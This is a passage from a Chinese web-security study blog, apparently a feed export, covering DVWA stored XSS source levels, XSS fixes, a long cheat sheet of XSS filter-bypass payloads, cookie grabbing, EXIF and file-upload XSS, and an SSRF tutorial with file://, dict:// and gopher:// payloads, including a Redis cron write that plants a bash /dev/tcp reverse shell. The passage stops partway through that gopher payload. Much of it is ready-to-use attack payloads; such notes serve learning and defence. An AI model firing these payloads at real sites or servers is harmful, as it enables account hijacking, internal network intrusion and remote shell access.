= <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code></p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p><h4 id="impossible-1">impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个参数都用了<code>htmlspecialchars()</code>和<code>mysql_real_escape_string()</code>安全</p><h2 id="漏洞修复">漏洞修复</h2><ol type="1"><li>用户端的输入</li></ol><p>输入过滤 推荐白名单，不推荐黑名单，在服务端做。</p><ol start="2" type="1"><li>用户端的输出</li></ol><p>输出过滤(重点) 推荐HTML编码和JS转义。</p><h2 id="常见xss题型">常见XSS题型</h2><ol type="1"><li>无过滤</li></ol><p><code>?a=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2" type="1"><li>escape()函数过滤</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>escape(a)<br></code></pre></td></tr></table></figure><p><code>?a=';alert(1);//或?a=';alert(1);'</code></p><ol start="3" type="1"><li>javascript重定向与伪链接</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">location.href</span>=a<br></code></pre></td></tr></table></figure><p><code>?a=javascript:alert(1)</code></p><ol start="4" type="1"><li>AngularJS沙箱绕过</li></ol><p>如果使用了AngularJS框架（version1.2-1.5）如果payload：?a=4传回值4，说明可能存在XSS构造payload：<code>&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;</code></p><ol start="5" type="1"><li>bypass_csp</li></ol><p>参考https://xz.aliyun.com/t/9254#toc-6</p><h2 id="xss语句">xss语句</h2><h3 id="弹窗函数">弹窗函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">alert()<br>confirm()<br>prompt()<br></code></pre></td></tr></table></figure><h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&lt;img src=1 οnerrοr=alert(1)&gt;<br>&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;alert(/1/)&lt;/script&gt;<br>&quot;/&gt;&lt;svg/οnlοad=prompt(/1/);&gt;<br>&lt;input id=&quot;aaa&quot; type=&quot;text&quot; value=&quot;输出点&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br>&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;<br>%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br>%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html<br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;<br>&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;<br>&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;<br>&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;<br>&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;<br>&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;<br>&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br>&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;<br>&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="特殊利用">特殊利用</h2><p>获取Cookie</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">alert</span><span class="hljs-params">(document.cookie)</span></span><br></code></pre></td></tr></table></figure><p>PDF-XSS</p><p>https://github.com/ynsmroztas/pdfsvgxsspayload</p><p>svg-XSS</p><p>https://github.com/ynsmroztas/pdfsvgxsspayload</p><p>EXIF-XSS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">exiftool -artist=&#x27;&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerrror</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span>&#x27; test.jpg<br></code></pre></td></tr></table></figure><p>文件上传XSS</p><h2 id="工具">工具</h2><p>XSS平台</p><p>https://xsshs.cn/ https://xss.pt/ http://xsscom.com</p><p>XSStrike</p><p>https://github.com/s0md3v/XSStrike</p><p>xsscrapy</p><p>https://github.com/DanMcInerney/xsscrapy</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/01/SSRF/"/>
    <url>/2023/01/01/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf">SSRF</h1><h2 id="一概念">一、概念</h2><p>SSRF (Server-Side RequestForgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二ssrf漏洞原理">二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTPGET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三漏洞函数">三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code></p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四协议">四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file">file://</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict">dict://</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher">gopher://</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code>，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol type="1"><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset 